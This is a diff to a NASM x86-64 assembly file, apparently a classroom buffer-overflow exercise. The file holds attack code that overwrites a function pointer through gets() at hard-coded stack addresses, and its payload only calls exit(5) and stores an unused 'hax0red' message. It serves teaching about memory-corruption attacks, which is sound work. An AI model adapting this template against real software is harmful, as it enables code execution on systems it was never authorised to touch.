@@ -15,7 +15,10 @@ BITS 64 ; We're writing 64-bit x86 code
 %define buffer_ptr 0x7fffffffe2d0  ; this attack will be written to this buffer location
 %define func_ptr   0x7fffffffe3d0  ; this is the function pointer located after the normal buffer which we're going to overwrite
 
+org buffer_ptr ; The org directive sets where the assembler *assumes* this code lives in memory. Normally you don't specify this in a normal assembly program, but here we need to know so that label references can work properly, since our code is loaded via *crime* rather than via the OS program loader.
+
 ; == BEGIN BUFFER; MACHINE CODE GOES HERE ==
+
 
 ; Set rax to syscall number 60, exit. Unlike the in-class example, we don't have to worry
 ; about NULL bytes being in our attack code, as gets *only* stops at a newline.
@@ -25,7 +28,7 @@ mov rax,60
 mov rdi,5
 
 ; do the system call
-; (see https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux for info on how doing system calls works (note -- that page uses AT&T syntax assembly, whereas this is Intel syntax))
+; (see https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux for info on how doing system calls works (note -- that page uses AT&T syntax assembly, whereas this program uses Intel syntax))
 ; (see https://filippo.io/linux-syscall-table/ for syscall numbers (double-click a table row for parameters)
 syscall
 
@@ -33,9 +36,7 @@ syscall
 
 ; here's how we store a message in the attack buffer and note its length -- this attack doesn't make use of the message though
 ; note that there is no null terminator automatically included in NASM strings
-; you can use the message label elsewhere in code to get the offset into the attack buffer where the message is
-; you can use (buffer_ptr+message-$$) to get the absolute address of the message
-message db "hax0red"
+message db "**_You_got_hax0red!_**"
 ; you can use the macro message_len to get the length of the message in bytes
 message_len equ $-message
 
